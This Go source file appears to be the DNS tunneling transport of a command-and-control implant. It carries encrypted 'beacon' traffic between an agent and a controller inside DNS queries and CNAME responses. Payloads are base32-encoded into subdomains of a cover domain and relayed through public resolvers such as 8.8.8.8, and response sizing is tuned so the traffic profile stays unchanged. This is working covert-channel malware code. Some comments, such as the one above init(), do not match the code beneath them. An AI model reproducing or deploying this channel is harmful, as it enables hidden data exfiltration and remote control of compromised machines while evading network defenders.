package transport

import (
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// =============================================================================
// DNS Transport — Transport interface over DNS queries
// =============================================================================
//
// DNSTransport tunnels beacon traffic inside DNS queries and responses.
// Each Send() call produces a single DNS A-record query → CNAME response
// exchange. The encrypted payload is base32-encoded into the query
// subdomain; the server's response is extracted from the CNAME target.
//
// Two deployment modes:
//
//   Direct (testing/lab):
//     Agent sends DNS queries directly to the controller's IP:port.
//     No domain registration needed.
//
//   Recursive (production):
//     Agent sends queries through a public resolver (e.g. 8.8.8.8:53).
//     Requires a registered domain with NS delegated to the controller.
//
// Integration with SecureSession:
//
//   app data
//     → SecureSession.WrapOutgoing()  → [msgData][AEAD ciphertext]
//     → DNSTransport.Send()           → DNS query with base32(ct).domain
//     → … network …
//     → controller decodes & responds → DNS CNAME response
//     → DNSTransport.Send returns     → raw response bytes
//     → SecureSession.UnwrapIncoming()→ app data

// dnsTransportConfig holds internal configuration for DNSTransport.
type dnsTransportConfig struct {
	// DNS server to query — "1.2.3.4:53", "8.8.8.8:53", etc.
	dnsServer string

	// Cover domain whose NS points to the controller.
	coverDomain string

	// Protocol version label embedded in queries.
	version string

	// UDP read timeout for a single DNS exchange.
	timeout time.Duration

	// Maximum retries for transient UDP failures.
	maxRetries int

	// Logger, when set, receives diagnostic messages.
	logger func(format string, args ...interface{})
}

// DNSTransportOption is a functional option for NewDNSTransport.
type DNSTransportOption func(*dnsTransportConfig)

// WithDNSServer sets the DNS server address (host:port).
//
//	Direct mode:  WithDNSServer("10.0.0.5:53")
//	Recursive:    WithDNSServer("8.8.8.8:53")
func WithDNSServer(addr string) DNSTransportOption {
	return func(c *dnsTransportConfig) { c.dnsServer = addr }
}

// WithCoverDomain sets the authoritative domain for encoded queries.
func WithCoverDomain(domain string) DNSTransportOption {
	return func(c *dnsTransportConfig) { c.coverDomain = domain }
}

// WithDNSVersion sets the protocol version label.
func WithDNSVersion(v string) DNSTransportOption {
	return func(c *dnsTransportConfig) { c.version = v }
}

// WithDNSTimeout sets the UDP read timeout.
func WithDNSTimeout(d time.Duration) DNSTransportOption {
	return func(c *dnsTransportConfig) { c.timeout = d }
}

// WithDNSMaxRetries sets the retry count for transient failures.
func WithDNSMaxRetries(n int) DNSTransportOption {
	return func(c *dnsTransportConfig) { c.maxRetries = n }
}

// WithDNSLogger attaches a diagnostic logger.
func WithDNSLogger(fn func(format string, args ...interface{})) DNSTransportOption {
	return func(c *dnsTransportConfig) { c.logger = fn }
}

// DNSTransport implements Transport over DNS.
type DNSTransport struct {
	cfg *dnsTransportConfig
	obf *DNSObfuscator

	client *dns.Client

	seqMu sync.Mutex
	seq   byte // incrementing sequence counter
}

// NewDNSTransport creates a DNSTransport with the given configuration.
//
// Example:
//
//	t, err := NewDNSTransport(
//	    WithDNSServer("10.0.0.5:53"),
//	    WithCoverDomain("sync.example.com"),
//	    WithDNSVersion("v1"),
//	)
func NewDNSTransport(opts ...DNSTransportOption) (*DNSTransport, error) {
	cfg := &dnsTransportConfig{
		dnsServer:   "127.0.0.1:5353", // safe default for local dev
		coverDomain: "sync.example.com",
		version:     "v1",
		timeout:     5 * time.Second,
		maxRetries:  2,
	}
	for _, opt := range opts {
		opt(cfg)
	}

	if cfg.dnsServer == "" {
		return nil, fmt.Errorf("dns transport: server address is required")
	}
	if cfg.coverDomain == "" {
		return nil, fmt.Errorf("dns transport: cover domain is required")
	}

	obf := NewDNSObfuscator(cfg.coverDomain, cfg.version)

	return &DNSTransport{
		cfg: cfg,
		obf: obf,
		client: &dns.Client{
			Net:     "udp",
			Timeout: cfg.timeout,
			// UDPSize is the max UDP payload we'll accept from the
			// server. RFC 6891 EDNS0 allows up to 4096; a CNAME
			// chain or TXT response can easily exceed 512 (RFC 1035
			// minimum). Setting this avoids truncation (TC=1) and a
			// fallback to TCP, which would change the traffic profile.
			UDPSize: 4096,
		},
	}, nil
}

// =============================================================================
// Transport interface
// =============================================================================

// Connect verifies that the DNS server is reachable by sending a
// benign query (no payload) and checking for a response. Any
// response — even NXDOMAIN — confirms the server is alive.
func (t *DNSTransport) Connect() error {
	// Build a benign query: an A-record lookup for the cover domain
	// itself with no encoded data. The server's DNS handler should
	// respond (even with SOA/NXDOMAIN), confirming reachability.
	msg := new(dns.Msg)
	msg.SetQuestion(t.cfg.coverDomain+".", dns.TypeA)
	msg.RecursionDesired = true

	t.debug("[dns] connect probe → %s (%s)", t.cfg.coverDomain, t.cfg.dnsServer)

	_, _, err := t.client.Exchange(msg, t.cfg.dnsServer)
	if err != nil {
		return fmt.Errorf("dns connect: %w", err)
	}

	// Any response without a network error means the DNS server is
	// reachable — even NXDOMAIN is fine.
	return nil
}

// Send transmits payload to the server and returns the response.
//
// Under the hood this performs a single DNS exchange:
//  1. Encodes payload into a DNS A-record query
//  2. Sends the query to the configured DNS server
//  3. Extracts the response payload from the CNAME record
func (t *DNSTransport) Send(payload []byte) ([]byte, error) {
	if len(payload) > MaxRawPayload {
		return nil, fmt.Errorf("DNS SEND: PAYLOAD %d BYTES EXCEED MAXRAWPAYLOAD %d", len(payload), MaxRawPayload)
	}

	seq := t.nextSeq()

	query, err := t.obf.EncodeQuery(payload, seq)
	if err != nil {
		return nil, fmt.Errorf("DNS SEND: ENCODE: %w", err)
	}

	t.debug("[dns] query %q (%d bytes payload, seq=%d)",
		query.Question[0].Name, len(payload), seq)

	// Retry loop for transient UDP failures (timeout, network
	// unreachable). We do NOT retry on NXDOMAIN or SERVFAIL —
	// those are authoritative answers, not network errors.
	var lastErr error
	for attempt := 0; attempt <= t.cfg.maxRetries; attempt++ {
		if attempt > 0 {
			// Small backoff between retries to avoid
			// hammering the resolver.
			time.Sleep(time.Duration(attempt) * 500 * time.Millisecond)
			t.debug("[dns] retry %d/%d", attempt, t.cfg.maxRetries)
		}

		response, rtt, err := t.client.Exchange(query, t.cfg.dnsServer)
		if err != nil {
			lastErr = err
			continue
		}

		t.debug("[dns] response in %v (rcode=%s, answers=%d)",
			rtt, dns.RcodeToString[response.Rcode], len(response.Answer))

		// fix the problem of decoding without getting data
		if response.Rcode != dns.RcodeSuccess {
			return nil, fmt.Errorf("DNS SEND: DECODE %s", dns.RcodeToString[response.Rcode])
		}

		resp, _, err := t.obf.DecodeResponse(response)
		if err != nil {
			// Decode failure is not a network error — don't
			// retry; the server sent something unexpected.
			return nil, fmt.Errorf("DNS SEND: DECODE: %w", err)
		}

		return resp, nil
	}

	return nil, fmt.Errorf("dns send: after %d retries: %w", t.cfg.maxRetries, lastErr)
}

// Close cleans up resources. For UDP DNS there is no persistent
// connection to tear down, so this is a no-op.
func (t *DNSTransport) Close() error {
	return nil
}

// =============================================================================
// Accessors
// =============================================================================

// ServerAddr returns the DNS server address.
func (t *DNSTransport) ServerAddr() string { return t.cfg.dnsServer }

// CoverDomain returns the cover domain used for encoding.
func (t *DNSTransport) CoverDomain() string { return t.cfg.coverDomain }

// =============================================================================
// Internal
// =============================================================================

func (t *DNSTransport) nextSeq() byte {
	t.seqMu.Lock()
	defer t.seqMu.Unlock()
	s := t.seq
	t.seq++
	return s
}

func (t *DNSTransport) debug(format string, args ...interface{}) {
	if t.cfg.logger != nil {
		t.cfg.logger(format, args...)
	}
}

// =============================================================================
// Testing helpers
// =============================================================================

// ResolveLocally sends a DNS query through the system resolver (not
// the configured DNS server). This is useful for testing that the
// cover domain is correctly delegated before switching to the
// transport.
//
// Uses net.LookupHost, so it follows the OS resolver configuration
// (/etc/resolv.conf or Windows DNS settings).
func (t *DNSTransport) ResolveLocally() ([]string, error) {
	return net.LookupHost(t.cfg.coverDomain)
}

// Ensure DNSTransport satisfies Transport at compile time.
var _ Transport = (*DNSTransport)(nil)

// Ensure DNS client owns its connection pool correctly.
func init() {
	// Prevent the DNS client from being garbage-collected without
	// closing its connections (though for UDP this is a no-op).
	log.SetPrefix("[dns-transport] ")
}
